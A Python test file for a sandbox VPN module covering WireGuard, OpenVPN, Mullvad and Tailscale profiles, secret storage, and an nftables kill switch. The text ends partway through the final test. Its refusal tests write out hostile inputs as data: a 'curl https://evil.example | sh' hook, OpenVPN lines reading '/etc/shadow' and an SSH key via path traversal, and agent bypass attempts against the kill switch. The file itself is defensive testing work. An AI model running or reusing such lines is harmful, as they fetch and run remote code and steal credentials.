"""VPN: profiles (WireGuard, OpenVPN, Mullvad, Tailscale), secrets, the kill switch, the checks and the container,
without Podman. The bypass tests are named after what an agent (or a hostile configuration) would try."""
import argparse
import base64
import errno
import http.server
import importlib.util
import ipaddress
import json
import os
from pathlib import Path
import shutil
import socket
import ssl
import stat
import struct
import subprocess
import sys
import threading
import types

import pytest

ROOT = Path(__file__).resolve().parents[1]


def load(name, file):
    spec = importlib.util.spec_from_file_location(name, ROOT / "sandbox" / file)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


s = load("agent_sandbox_vpn_test", "agent_sandbox.py")
rt = load("vpn_runtime_test", "vpn_runtime.py")
v = s.load_vpn_module()

PRIVATE = "YHxu1CXMdjUJ3RDN8sNLpz7yMUm1C0VNjwz3aXbwm2Y="  # a valid key made for these tests only
PRESHARED = base64.b64encode(bytes(range(32))).decode()
PEER = v.public_key(v.generate_private_key())
OTHER_PEER = v.public_key(v.generate_private_key())
ACCOUNT = "1234567890123456"  # shaped like a Mullvad account number, belongs to nobody

WIREGUARD = f"""# Downloaded from a provider
[Interface]
PrivateKey = {PRIVATE}
Address = 10.66.1.2/32, fd00:66::2/128
DNS = 10.66.0.1, fd00:66::1, corp.example
MTU = 1380

[Peer]
PublicKey = {PEER}
PresharedKey = {PRESHARED}
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = vpn.example.org:51820
PersistentKeepalive = 15
"""


@pytest.fixture
def home(tmp_path, monkeypatch):
    """A private HOME: profiles, secrets (the file store) and state in temporary directories."""
    for name, sub in (("HOME", "home"), ("XDG_CONFIG_HOME", "config"), ("XDG_DATA_HOME", "data")):
        (tmp_path / sub).mkdir()
        monkeypatch.setenv(name, str(tmp_path / sub))
    monkeypatch.setenv("SANDBOX_AI_SECRETS", "file")
    return tmp_path


def secrets_dir(home):
    return home / "data" / "sandbox-ai" / "secrets"


def add_args(name, **values):
    defaults = {"name": name, "wireguard": None, "openvpn": None, "mullvad": False, "tailscale": False, "dns": [],
                "check_url": [], "no_dns_probe": False, "provider": None, "force": False, "auth_secret": None,
                "split": False, "account_secret": None, "location": None, "no_ipv6": False, "endpoint_ipv6": False,
                "auth_key_secret": None, "exit_node": None, "login_server": None, "hostname": None,
                "ephemeral": False, "tailnet_allow": []}
    return argparse.Namespace(**{**defaults, **values})


# --- WireGuard configurations -----------------------------------------------------------------------------------

def test_wireguard_configuration_with_ipv6_dns_and_preshared_key():
    wireguard, secrets, notes = v.parse_wireguard(WIREGUARD)
    assert wireguard["addresses"] == ["10.66.1.2/32", "fd00:66::2/128"]
    assert wireguard["dns"] == ["10.66.0.1", "fd00:66::1"] and any("corp.example" in n for n in notes)
    assert wireguard["mtu"] == 1380
    peer = wireguard["peers"][0]
    assert peer["allowed_ips"] == ["0.0.0.0/0", "::/0"] and peer["keepalive"] == 15 and peer["preshared"]
    assert peer["endpoint"] == {"host": "vpn.example.org", "port": 51820} and peer["public_key"] == PEER
    assert secrets == {"private_key": PRIVATE, "preshared_keys": {"0": PRESHARED}}
    # The keys live apart from what is stored in the profile.
    assert PRIVATE not in json.dumps(wireguard) and PRESHARED not in json.dumps(wireguard)


def test_wireguard_peers_endpoints_and_split_tunnels():
    text = f"""[Interface]
PrivateKey={PRIVATE}
Address=10.8.0.2/24
[Peer]
PublicKey={PEER}
AllowedIPs=10.8.0.0/24,192.168.10.0/24
Endpoint=[2001:db8::7]:51820
[Peer]
PublicKey={OTHER_PEER}
AllowedIPs=10.9.0.0/16, fd00:9::/64
Endpoint=198.51.100.9:4500
PersistentKeepalive=off
"""
    wireguard, secrets, notes = v.parse_wireguard(text)
    assert [p["endpoint"] for p in wireguard["peers"]] == [{"host": "2001:db8::7", "port": 51820},
                                                          {"host": "198.51.100.9", "port": 4500}]
    assert wireguard["peers"][1]["keepalive"] is None and secrets["preshared_keys"] == {}
    # IPv6 networks without an IPv6 address: blocked, and said so.
    assert any("IPv6 is blocked" in n for n in notes)
    assert v.describe({"name": "x", "type": "wireguard", "wireguard": wireguard})["tunnel"] == "split"


@pytest.mark.parametrize("line, message", [
    ("PostUp = iptables -A FORWARD -j ACCEPT", "would run a command"),
    ("PreDown = curl https://evil.example | sh", "would run a command"),
    ("Table = 1234", "routes the tunnel itself"),
    ("SaveConfig = true", "never writes the configuration back"),
    ("MTU = 100", "MTU must be"),
    ("Bogus = 1", "not supported"),
])
def test_wireguard_configurations_that_are_refused(line, message):
    text = WIREGUARD.replace("MTU = 1380", line)
    with pytest.raises(ValueError, match=message):
        v.parse_wireguard(text)


@pytest.mark.parametrize("change, message", [
    ((PRIVATE, "not-a-key"), "PrivateKey is not a WireGuard key"),
    (("Endpoint = vpn.example.org:51820", "Endpoint = [::1]"), "expected HOST:PORT"),
    (("Endpoint = vpn.example.org:51820", "Endpoint = bad_host!:51820"), "invalid host"),
    (("Endpoint = vpn.example.org:51820\n", ""), "nothing to connect to"),
    (("AllowedIPs = 0.0.0.0/0, ::/0", "AllowedIPs = everything"), "is not a network"),
    (("Address = 10.66.1.2/32, fd00:66::2/128\n", ""), "has no Address"),
    (("[Peer]", "[Pear]"), "unknown section"),
])
def test_wireguard_values_that_are_refused(change, message):
    with pytest.raises(ValueError, match=message):
        v.parse_wireguard(WIREGUARD.replace(*change))


def test_curve25519_matches_rfc_7748():
    alice = bytes.fromhex("77076d0a7318a57d3c16c17251b26645df4c2f87ebc0992ab177fba51db92c2a")
    bob = bytes.fromhex("5dab087e624a8a4b79e17f8b83800ee66f3bb1292618b6fd1c2f8b27ff88e0eb")
    base = (9).to_bytes(32, "little")
    assert v.x25519(alice, base).hex() == "8520f0098930a754748b7ddcb43ef75a0dbf3a0d26381af4eba4a98eaa9b4e6a"
    assert v.x25519(bob, base).hex() == "de9edb7d7b7dc1b4d35b61c2ece435373f8343c85b78674dadfc7e146f882b4f"
    shared = "4a5d9d5ba4ce2de1728e3bf480350f25e07e21c947d19e3376f09b3c1e161742"
    assert v.x25519(alice, v.x25519(bob, base)).hex() == v.x25519(bob, v.x25519(alice, base)).hex() == shared
    key = base64.b64decode(v.generate_private_key())
    assert len(key) == 32 and key[0] & 7 == 0 and key[31] & 0xC0 == 0x40  # clamped like `wg genkey`


# --- OpenVPN configurations ----------------------------------------------------------------------------------------

OPENVPN = """client
dev tun
proto udp
remote vpn1.example.org 1194
remote 198.51.100.9 443 tcp
remote-random
resolv-retry infinite
nobind
persist-key
cipher AES-256-GCM
verify-x509-name "C=CH, CN=server one" subject
auth-user-pass
dhcp-option DNS 10.8.0.1
verb 11
<ca>
-----BEGIN CERTIFICATE-----
MIIBfake
-----END CERTIFICATE-----
</ca>
<tls-crypt>
-----BEGIN OpenVPN Static key V1-----
00112233
-----END OpenVPN Static key V1-----
</tls-crypt>
"""


def test_openvpn_configuration_is_reduced_to_what_is_safe():
    config, info, credentials, notes = v.parse_openvpn(OPENVPN)
    assert info["remotes"] == [{"host": "vpn1.example.org", "port": 1194, "proto": "udp"},
                               {"host": "198.51.100.9", "port": 443, "proto": "tcp-client"}]
    assert info["auth"] and credentials is None and info["dns"] == ["10.8.0.1"]
    assert "remote " not in config.replace("remote-random", "")  # the container adds the resolved remotes
    assert "verb 4" in config and "verb 11" not in config  # more would log packet contents
    assert "<ca>" in config and "<tls-crypt>" in config and "MIIBfake" in config
    assert 'verify-x509-name "C=CH, CN=server one" subject' in config
    assert "dev tun" not in config and "dhcp-option" not in config


def test_openvpn_files_beside_the_configuration_are_taken_in(tmp_path):
    (tmp_path / "ca.crt").write_text("CA-PEM\n")
    (tmp_path / "ta.key").write_text("TA-KEY\n")
    (tmp_path / "pass.txt").write_text("alice\ns3cret\n")
    text = "client\nremote 198.51.100.9\nca ca.crt\ntls-auth ta.key 1\nauth-user-pass pass.txt\n"
    config, info, credentials, _ = v.parse_openvpn(text, tmp_path)
    assert "<ca>\nCA-PEM\n</ca>" in config and "<tls-auth>\nTA-KEY\n</tls-auth>" in config
    assert "key-direction 1" in config and credentials == ["alice", "s3cret"] and "s3cret" not in config


@pytest.mark.parametrize("line, message", [
    ("up /bin/sh", "runs a program"), ("script-security 2", "runs a program"), ("plugin /x.so", "runs a program"),
    ("dns-updown /x.sh", "runs a program"), ("management 127.0.0.1 7505", "reads or writes files"),
    ("log /tmp/x", "reads or writes files"), ("config other.ovpn", "reads or writes files"),
    ("http-proxy 192.0.2.1 8080", "through a proxy"), ("dev tap0", "only tun devices"),
    ("auth-user-pass ../../.ssh/id_ed25519", "only files beside the configuration"),
    ("key /etc/shadow", "only files beside the configuration"), ("frobnicate yes", "not supported"),
    ("<connection>\nremote x\n</connection>", "<connection> blocks"),
])
def test_openvpn_directives_that_are_refused(tmp_path, line, message):
    with pytest.raises(ValueError, match=message):
        v.parse_openvpn(OPENVPN + line + "\n", tmp_path)


def test_openvpn_needs_a_remote_and_a_ca():
    with pytest.raises(ValueError, match="no remote"):
        v.parse_openvpn("client\n<ca>\nx\n</ca>\n")
    with pytest.raises(ValueError, match="no CA"):
        v.parse_openvpn("client\nremote 198.51.100.9\n")


def test_openvpn_hook_records_tunnel_and_pushed_dns(tmp_path):
    environment = {"dev": "tun0", "ifconfig_local": "10.8.0.6", "ifconfig_ipv6_local": "fd00:8::6",
                   "foreign_option_2": "dhcp-option DNS6 fd00:8::1", "foreign_option_1": "dhcp-option DNS 10.8.0.1",
                   "foreign_option_3": "dhcp-option DOMAIN corp", "password": "never-recorded"}
    rt.openvpn_route_up(environment, tmp_path / "openvpn.json")
    state = json.loads((tmp_path / "openvpn.json").read_text())
    assert state == {"dev": "tun0", "ipv4": "10.8.0.6", "ipv6": "fd00:8::6", "dns": ["10.8.0.1", "fd00:8::1"]}


def test_openvpn_runs_only_our_own_hook_and_marks_its_packets():
    command = rt.openvpn_command(Path("/run/vpn/client.ovpn"), Path("/run/vpn/auth"), full=True)
    assert command[command.index("--mark") + 1] == str(rt.MARK)
    assert command[command.index("--route-up") + 1] == "/usr/bin/python3 -I /vpn/vpn_runtime.py openvpn-route-up"
    assert command[command.index("--redirect-gateway") + 1:][:2] == ["def1", "ipv6"]
    assert "--up" not in command and "--down" not in command
    assert "--redirect-gateway" not in rt.openvpn_command(Path("/c"), None, full=False)


# --- profiles and secrets ----------------------------------------------------------------------------------------

def test_wireguard_profile_keeps_its_keys_in_the_secret_store(home, capsys):
    source = home / "provider.conf"
    source.write_text(WIREGUARD)
    assert v.main(["add", "corp", "--wireguard", str(source)]) == 0
    profile_file = home / "config" / "sandbox-ai" / "vpn" / "corp.json"
    text = profile_file.read_text()
    assert PRIVATE not in text and PRESHARED not in text
    assert stat.S_IMODE(profile_file.stat().st_mode) == 0o600
    assert stat.S_IMODE(profile_file.parent.stat().st_mode) == 0o700
    stored = secrets_dir(home)
    assert (stored / "VPN_CORP_KEY").read_text() == PRIVATE and (stored / "VPN_CORP_PSK0").read_text() == PRESHARED
    assert stat.S_IMODE((stored / "VPN_CORP_KEY").stat().st_mode) == 0o600
    assert v.main(["show", "corp", "--json"]) == 0 and v.main(["list"]) == 0
    out = capsys.readouterr().out
    assert PRIVATE not in out and PRESHARED not in out and v.public_key(PRIVATE) in out
    assert "corp  wireguard" in out and "vpn.example.org:51820" in out
    with pytest.raises(ValueError, match="exists already"):
        v.main(["add", "corp", "--wireguard", str(source)])
    assert v.main(["remove", "corp"]) == 0
    assert not profile_file.exists() and not (stored / "VPN_CORP_KEY").exists() and not (stored / "VPN_CORP_PSK0").exists()


def test_openvpn_profile_moves_credentials_to_the_secret_store(home, capsys):
    source = home / "provider.ovpn"
    source.write_text(OPENVPN.replace("auth-user-pass\n", "<auth-user-pass>\nalice\ns3cret\n</auth-user-pass>\n"))
    assert v.main(["add", "work", "--openvpn", str(source)]) == 0
    config = home / "config" / "sandbox-ai" / "vpn" / "work.ovpn"
    assert stat.S_IMODE(config.stat().st_mode) == 0o600 and "s3cret" not in config.read_text()
    assert (secrets_dir(home) / "VPN_WORK_AUTH").read_text() == "alice:s3cret"
    profile = v.load_profile("work")
    assert profile["openvpn"]["auth_secret"] == "VPN_WORK_AUTH" and profile["dns"] == ["10.8.0.1"]
    data = v.payload(profile, "serve", ["api.example.org"])
    assert data["secrets"]["openvpn_auth"] == "alice\ns3cret" and "<ca>" in data["secrets"]["openvpn_config"]
    assert "s3cret" not in json.dumps(data["profile"])
    # Without the credentials anywhere the import refuses.
    source.write_text(OPENVPN)
    with pytest.raises(ValueError, match="--auth-secret"):
        v.main(["add", "other", "--openvpn", str(source)])


def test_tailscale_profiles(home, capsys):
    assert v.main(["add", "ts", "--tailscale", "--exit-node", "exit-1", "--auth-key-secret", "TS_KEY"]) == 0
    profile = v.load_profile("ts")
    assert profile["tailscale"]["exit_node"] == "exit-1" and profile["tailscale"]["hostname"] == "sandbox-ai-ts"
    assert profile["tailscale"]["tailnet_allow"] == rt.TAILNET
    with pytest.raises(ValueError, match="needs --auth-key-secret"):
        v.main(["add", "eph", "--tailscale", "--ephemeral"])
    with pytest.raises(ValueError, match="https URL"):
        v.main(["add", "hs", "--tailscale", "--login-server", "http://headscale.example"])
    with pytest.raises(ValueError, match="secret TS_KEY"):
        v.payload(profile, "serve")  # the auth key is not kept yet
    (secrets_dir(home)).mkdir(parents=True, exist_ok=True)
    v.secret_store().FileStore().set("TS_KEY", "tskey-auth-abc123")
    assert v.payload(profile, "serve")["secrets"] == {"tailscale_auth_key": "tskey-auth-abc123"}


def test_profile_names(home):
    for name in ("", "a b", "x" * 33, "../x", "-x"):
        with pytest.raises(ValueError, match="profile name"):
            v.check_name(name)
    source = home / "c.conf"
    source.write_text(WIREGUARD)
    v.main(["add", "a-b", "--wireguard", str(source)])
    with pytest.raises(ValueError, match="would share their secrets' names"):
        v.main(["add", "a_b", "--wireguard", str(source)])
    with pytest.raises(ValueError, match="no VPN profile nope"):
        v.load_profile("nope")


def test_a_profile_someone_else_could_edit_is_refused(home):
    source = home / "c.conf"
    source.write_text(WIREGUARD)
    v.main(["add", "corp", "--wireguard", str(source)])
    v.profile_path("corp").chmod(0o644)
    with pytest.raises(ValueError, match="private file"):
        v.load_profile("corp")


# --- Mullvad, against a fake HTTPS API -------------------------------------------------------------------------------

RELAY_KEY = v.public_key(v.generate_private_key())
APP_RELAYS = {"locations": {"se-sto": {"city": "Stockholm", "country": "Sweden"}},
              "wireguard": {"ipv4_gateway": "10.64.0.1", "ipv6_gateway": "fc00:bbbb:bbbb:bb01::1",
                            "relays": [{"hostname": "se-sto-wg-001", "location": "se-sto", "active": True,
                                        "public_key": RELAY_KEY, "ipv4_addr_in": "185.65.134.10",
                                        "ipv6_addr_in": "2a03:1b20:3:f011::a01f"},
                                       {"hostname": "se-sto-wg-002", "location": "se-sto", "active": False,
                                        "public_key": RELAY_KEY, "ipv4_addr_in": "185.65.134.11"},
                                       {"hostname": "de-fra-wg-001", "location": "de-fra", "active": True,
                                        "public_key": RELAY_KEY, "ipv4_addr_in": "193.32.248.66"}]}}
PUBLIC_RELAYS = {"countries": [{"name": "Sweden", "code": "se", "cities": [
    {"name": "Gothenburg", "code": "got", "relays": [{"hostname": "se-got-wg-001", "public_key": RELAY_KEY,
                                                       "ipv4_addr_in": "185.213.154.66"}]}]}]}


@pytest.fixture(scope="module")
def certificate(tmp_path_factory):
    if not shutil.which("openssl"):
        pytest.skip("needs openssl")
    directory = tmp_path_factory.mktemp("tls")
    subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-days", "2", "-subj", "/CN=localhost",
                    "-addext", "subjectAltName=DNS:localhost,IP:127.0.0.1", "-keyout", str(directory / "key.pem"),
                    "-out", str(directory / "cert.pem")], check=True, capture_output=True)
    return directory


class FakeAPI:
    """An HTTPS server for the tests: ROUTES maps (method, path) to (status, JSON); every request is recorded."""

    def __init__(self, certificate, routes):
        self.routes, self.requests = routes, []
        api = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def handle_one(self):
                length = int(self.headers.get("Content-Length") or 0)
                body = self.rfile.read(length) if length else b""
                api.requests.append({"method": self.command, "path": self.path, "body": body,
                                     "authorization": self.headers.get("Authorization")})
                route = api.routes.get((self.command, self.path))
                status, document = route(body, self.headers) if callable(route) else route or (404, {"code": "NOPE"})
                data = json.dumps(document).encode() if document is not None else b""
                self.send_response(status)
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            do_GET = do_POST = do_DELETE = handle_one

            def log_message(self, *args):
                pass
        self.server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certificate / "cert.pem", certificate / "key.pem")
        self.server.socket = context.wrap_socket(self.server.socket, server_side=True)
        self.url = f"https://localhost:{self.server.server_address[1]}"
        self.client_context = ssl.create_default_context(cafile=str(certificate / "cert.pem"))
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def close(self):
        self.server.shutdown()


def mullvad_routes(devices_status=201):
    def token(body, headers):
        account = json.loads(body).get("account_number")
        return (200, {"access_token": "tok-1", "expiry": "2030-01-01T00:00:00Z"}) if account == ACCOUNT else \
            (400, {"code": "INVALID_ACCOUNT", "error": f"no account {account}"})

    def device(body, headers):
        if headers.get("Authorization") != "Bearer tok-1":
            return 401, {"code": "INVALID_ACCESS_TOKEN"}
        if devices_status != 201:
            return devices_status, {"code": "MAX_DEVICES_REACHED"}
        return 201, {"id": "dev-1", "name": "happy otter", "pubkey": json.loads(body)["pubkey"], "hijack_dns": False,
                     "ipv4_address": "10.68.1.2/32", "ipv6_address": "fc00:bbbb:bbbb:bb01::1:2/128"}
    return {("POST", "/auth/v1/token"): token, ("POST", "/accounts/v1/devices"): device,
            ("GET", "/app/v1/relays"): (200, APP_RELAYS), ("DELETE", "/accounts/v1/devices/dev-1"): (204, None)}


@pytest.fixture
def api(certificate):
    server = FakeAPI(certificate, mullvad_routes())
    yield server
    server.close()


def test_mullvad_client_token_device_and_relays(api):
    client = v.Mullvad(api.url, api.client_context)
    token = client.token(ACCOUNT)
    device = client.create_device(token, RELAY_KEY)
    assert device == {"id": "dev-1", "name": "happy otter",
                      "addresses": ["10.68.1.2/32", "fc00:bbbb:bbbb:bb01::1:2/128"]}
    relays, gateways = client.relays()
    assert [r["hostname"] for r in relays] == ["se-sto-wg-001", "de-fra-wg-001"]  # the inactive one is left out
    assert gateways == {"ipv4": "10.64.0.1", "ipv6": "fc00:bbbb:bbbb:bb01::1"}
    assert v.choose_relay(relays, "se-sto")["hostname"] == v.choose_relay(relays, "se")["hostname"] == "se-sto-wg-001"
    with pytest.raises(ValueError, match="no WireGuard relay at us-nyc.*de-fra, se-sto"):
        v.choose_relay(relays, "us-nyc")
    client.delete_device(token, "dev-1")
    assert [r["authorization"] for r in api.requests if r["path"].startswith("/accounts")] == ["Bearer tok-1"] * 2


def test_mullvad_public_relay_list_when_the_app_list_is_gone(api):
    del api.routes[("GET", "/app/v1/relays")]
    api.routes[("GET", "/public/relays/wireguard/v1/")] = (200, PUBLIC_RELAYS)
    relays, _ = v.Mullvad(api.url, api.client_context).relays()
    assert relays == [{"hostname": "se-got-wg-001", "location": "se-got", "public_key": RELAY_KEY,
                       "ipv4": "185.213.154.66", "ipv6": None}]


def test_mullvad_errors_never_contain_the_account_number(api, certificate):
    client = v.Mullvad(api.url, api.client_context)
    with pytest.raises(ValueError) as caught:
        client.token("6543210987654321")
    assert "the account number is not valid" in str(caught.value) and "6543210987654321" not in str(caught.value)
    full = FakeAPI(certificate, mullvad_routes(devices_status=400))
    try:
        with pytest.raises(ValueError, match="maximum number of devices"):
            v.Mullvad(full.url, full.client_context).create_device("tok-1", RELAY_KEY)
    finally:
        full.close()
    with pytest.raises(ValueError) as caught:
        v.Mullvad("https://127.0.0.1:1", api.client_context, timeout=2).token(ACCOUNT)
    assert "not reachable" in str(caught.value) and ACCOUNT not in str(caught.value)
    with pytest.raises(ValueError, match="16 digits"):
        v.read_account(prompt=lambda _: "12345")


def test_mullvad_profile_end_to_end(home, api, capsys):
    out = []
    client = v.Mullvad(api.url, api.client_context)
    profile = v.add_mullvad(add_args("mv", mullvad=True, location="se-sto"), out.append, client,
                            prompt=lambda _: "1234 5678 9012 3456")
    v.save_profile(profile)
    peer = profile["wireguard"]["peers"][0]
    assert peer == {"public_key": RELAY_KEY, "allowed_ips": ["0.0.0.0/0", "::/0"],
                    "endpoint": {"host": "185.65.134.10", "port": 51820}, "keepalive": None, "preshared": False}
    assert profile["wireguard"]["addresses"] == ["10.68.1.2/32", "fc00:bbbb:bbbb:bb01::1:2/128"]
    assert profile["dns"] == ["10.64.0.1", "fc00:bbbb:bbbb:bb01::1"] and profile["provider"] == "mullvad"
    assert v.check_settings(profile)["urls"][0] == "https://am.i.mullvad.net/json"
    private = (secrets_dir(home) / "VPN_MV_KEY").read_text()
    registered = json.loads(next(r for r in api.requests if r["path"] == "/accounts/v1/devices")["body"])["pubkey"]
    assert registered == v.public_key(private) == profile["public_key"]
    # The account number reached the token request and nothing else: not the profile, output or other requests.
    assert [r["path"] for r in api.requests if ACCOUNT.encode() in r["body"]] == ["/auth/v1/token"]
    everything = json.dumps(profile) + "\n".join(out) + capsys.readouterr().out
    assert ACCOUNT not in everything and private not in everything
    no_v6 = v.add_mullvad(add_args("mv4", mullvad=True, no_ipv6=True), out.append, client, prompt=lambda _: ACCOUNT)
    assert no_v6["wireguard"]["addresses"] == ["10.68.1.2/32"] and no_v6["dns"] == ["10.64.0.1"]
    assert no_v6["wireguard"]["peers"][0]["allowed_ips"] == ["0.0.0.0/0"]


# --- the kill switch -------------------------------------------------------------------------------------------------

def output_chain(rules):
    return rules.split(" chain output")[1].split("\n }\n")[0]


def test_kill_switch_lets_only_the_tunnel_and_its_marked_packets_out():
    rules = rt.killswitch_rules("wg0", [("198.51.100.7", "udp", 51820), ("2001:db8::7", "udp", 51820)])
    output = output_chain(rules)
    assert "policy drop" in output and output.rstrip().endswith("reject with icmpx type admin-prohibited")
    assert '  oifname "wg0" accept' in output and '  oifname "lo" accept' in output
    assert "meta mark 0xca6c ip daddr 198.51.100.7 udp dport 51820 accept" in output
    assert "meta mark 0xca6c ip6 daddr 2001:db8::7 udp dport 51820 accept" in output
    # Bypass: the agent sends to the endpoint itself. Without the mark (which needs CAP_NET_ADMIN) it is refused.
    endpoint_rules = [line for line in output.splitlines() if "198.51.100.7" in line or "2001:db8::7" in line]
    assert endpoint_rules and all("meta mark 0xca6c" in line for line in endpoint_rules)
    # Bypass: agent-controlled DNS. Nothing on port 53 (or any port) leaves past the tunnel.
    assert "dport 53" not in rules and "\n  accept" not in output
    assert "forward priority -5; policy drop" in rules


def test_kill_switch_does_not_let_established_connections_continue_past_the_tunnel():
    output = output_chain(rt.killswitch_rules("wg0", [("198.51.100.7", "udp", 51820)]))
    assert "ct state" not in output  # a connection that went through the tunnel must not continue over the uplink
    assert "ct state established,related accept" in rt.killswitch_rules("wg0").split(" chain input")[1]


def test_kill_switch_blocks_ipv6_when_the_tunnel_has_only_ipv4():
    output = output_chain(rt.killswitch_rules("wg0", [("198.51.100.7", "udp", 51820)], tunnel_ipv6=False))
    lines = output.splitlines()
    assert lines.index('  oifname "wg0" meta nfproto ipv6 drop') < lines.index('  oifname "wg0" accept')
    # The only IPv6 that may leave over the uplink is neighbour discovery (link-local, hop limit 255).
    assert [line for line in lines if "ip6" in line and "accept" in line] == [
        "  ct status dnat ip6 daddr ::1 accept",
        "  ip6 hoplimit 255 icmpv6 type { nd-router-solicit, nd-neighbor-solicit, nd-neighbor-advert } accept"]


def test_kill_switch_for_tailscale_follows_its_mark_anywhere():
    rules = rt.killswitch_rules("tailscale0", mark=rt.TAILSCALE_MARK[0], mask=rt.TAILSCALE_MARK[1], any_marked=True)
    assert "  meta mark and 0xff0000 == 0x80000 accept" in output_chain(rules)
    with pytest.raises(ValueError, match="endpoint protocol"):
        rt.killswitch_rules("wg0", [("198.51.100.7", "icmp", 0)])


def nft_in_a_namespace():
    if not shutil.which("nft") or not shutil.which("unshare"):
        return False
    return subprocess.run(["unshare", "-rn", "nft", "list", "ruleset"], capture_output=True).returncode == 0


@pytest.mark.skipif(not nft_in_a_namespace(), reason="needs nft in an unprivileged network namespace")
def test_rulesets_load_together_in_a_namespace(tmp_path):
    """Both tables in one namespace, as in a pod: the kill switch (v4/v6, Tailscale, Tor with its redirects) and the
    agent's firewall with the VPN's mark (and Tor's rules), so nft itself checks the syntax."""
    marked = s.firewall_rules(["10.1.0.0/16"], ["203.0.113.5"], log=True, dns=["10.64.0.1"],
                              proxy={"port": s.PROXY_PORT, "loopback": []}, vpn_mark=rt.mark_match(rt.MARK))
    tor_agent = s.firewall_rules(["10.192.0.0/10"], ["203.0.113.5"], log=True, dns=[rt.TOR_DNS],
                                 proxy={"port": s.PROXY_PORT, "loopback": []}, vpn_mark=f"meta skuid {rt.TOR_UID}",
                                 vpn_rules=v.tor_agent_rules(False, s.PROXY_UID))
    bridges = rt.parse_bridges("obfs4 192.0.2.10:443 " + "A" * 40 + " cert=abc iat-mode=0")
    for kill, agent in ((rt.killswitch_rules("wg0", [("198.51.100.7", "udp", 51820), ("2001:db8::7", "tcp", 443)],
                                              tunnel_ipv6=False), marked),
                        (rt.killswitch_rules("tailscale0", mark=rt.TAILSCALE_MARK[0], mask=rt.TAILSCALE_MARK[1],
                                             any_marked=True), marked),
                        (rt.tor_rules(), tor_agent), (rt.tor_rules(bridges=bridges), tor_agent)):
        (tmp_path / "kill.nft").write_text(kill)
        (tmp_path / "agent.nft").write_text(agent)
        result = subprocess.run(["unshare", "-rn", "sh", "-c", f"nft -f {tmp_path}/kill.nft && nft -f {tmp_path}/agent.nft"
                                 " && nft list tables"], capture_output=True, text=True)
        assert result.returncode == 0, result.stderr
        assert "sandbox_ai_vpn" in result.stdout and "agent_sandbox" in result.stdout


def test_the_agent_firewall_passes_the_vpns_own_packets_unredirected():
    mark = rt.mark_match(*rt.TAILSCALE_MARK)
    rules = s.firewall_rules([], ["203.0.113.5"], proxy={"port": s.PROXY_PORT, "loopback": []}, vpn_mark=mark)
    output = output_chain(rules).splitlines()
    assert output.index(f"  {mark} accept") < output.index("  jump runtime")
    nat = rules.split(" chain proxy")[1].splitlines()
    assert nat.index(f"  {mark} return") < next(i for i, line in enumerate(nat) if "redirect to" in line)
    assert "meta mark" not in s.firewall_rules([], ["203.0.113.5"])


# --- routes and WireGuard set-up ----------------------------------------------------------------------------------------

DEFAULTS = rt.parse_default_routes("default via 10.0.2.2 dev eth0 proto static metric 100\n",
                                   "default via fe80::1 dev eth0 metric 1024 pref medium\n")


def test_routes_full_tunnel_v4_and_v6():
    assert DEFAULTS == {4: ("10.0.2.2", "eth0"), 6: ("fe80::1", "eth0")}
    commands = rt.route_commands("wg0", ["10.66.1.2/32", "fd00:66::2/128"], ["0.0.0.0/0", "::/0"],
                                 [("198.51.100.7", "udp", 51820)], DEFAULTS, 1380)
    assert commands == [
        ["ip", "-4", "route", "replace", "198.51.100.7/32", "via", "10.0.2.2", "dev", "eth0"],
        ["ip", "-4", "address", "add", "10.66.1.2/32", "dev", "wg0"],
        ["ip", "-6", "address", "add", "fd00:66::2/128", "dev", "wg0"],
        ["ip", "link", "set", "dev", "wg0", "mtu", "1380", "up"],
        ["ip", "-4", "route", "replace", "default", "dev", "wg0"],
        ["ip", "-6", "route", "replace", "default", "dev", "wg0"]]


def test_routes_without_ipv6_and_for_split_tunnels():
    # IPv6 leak when the tunnel has only IPv4: no IPv6 route to the tunnel, and the kill switch drops the rest.
    commands = rt.route_commands("wg0", ["10.66.1.2/32"], ["0.0.0.0/0", "::/0"], [("198.51.100.7", "udp", 1)], DEFAULTS)
    assert not any(c[1] == "-6" for c in commands)
    split = rt.route_commands("wg0", ["10.8.0.2/24"], ["10.8.0.0/24", "192.168.10.0/24"], [], DEFAULTS)
    assert split[-2:] == [["ip", "-4", "route", "replace", "10.8.0.0/24", "dev", "wg0"],
                          ["ip", "-4", "route", "replace", "192.168.10.0/24", "dev", "wg0"]]
    assert not any("default" in c for c in split)
    with pytest.raises(ValueError, match="needs an IPv6 uplink"):
        rt.route_commands("wg0", ["10.8.0.2/24"], ["0.0.0.0/0"], [("2001:db8::7", "udp", 1)], {4: ("10.0.2.2", "eth0")})


def test_covers_all():
    assert rt.covers_all(["0.0.0.0/1", "128.0.0.0/1"], 4) and rt.covers_all(["::/0"], 6)
    assert not rt.covers_all(["10.0.0.0/8"], 4) and not rt.covers_all(["0.0.0.0/0"], 6)


class FakeRunner:
    """Records the set-up's commands; ip link add fails when KERNEL is False (no WireGuard module)."""

    def __init__(self, kernel=True):
        self.kernel, self.commands, self.children = kernel, [], []

    def run(self, command, data=None, check=True):
        self.commands.append((command, data))
        code, out = 0, ""
        if command[:3] == ["ip", "link", "add"] and not self.kernel:
            code = 2
        if command[:4] == ["ip", "-4", "route", "show"]:
            out = "default via 10.0.2.2 dev eth0\n"
        if command[:3] == ["ip", "route", "get"]:
            out = f"{command[3]} dev wg0 table 51820 src 10.66.1.2\n"
        return types.SimpleNamespace(returncode=code, stdout=out, stderr="")

    def spawn(self, command, log):
        self.commands.append((command, None))
        process = types.SimpleNamespace(args=command, poll=lambda: None)
        self.children.append(process)
        return process


@pytest.mark.parametrize("kernel", [True, False])
def test_wireguard_comes_up_behind_the_kill_switch(kernel, tmp_path, monkeypatch):
    monkeypatch.setattr(rt, "RUN", tmp_path)
    wireguard, secrets, _ = v.parse_wireguard(WIREGUARD)
    lookups = []

    def resolve(name, family):
        lookups.append((name, family))
        return ["198.51.100.7"] if family == 4 else []
    runner = FakeRunner(kernel)
    tunnel = rt.up_wireguard({"profile": {"type": "wireguard", "wireguard": wireguard, "dns": wireguard["dns"]},
                              "secrets": secrets}, runner, resolve)
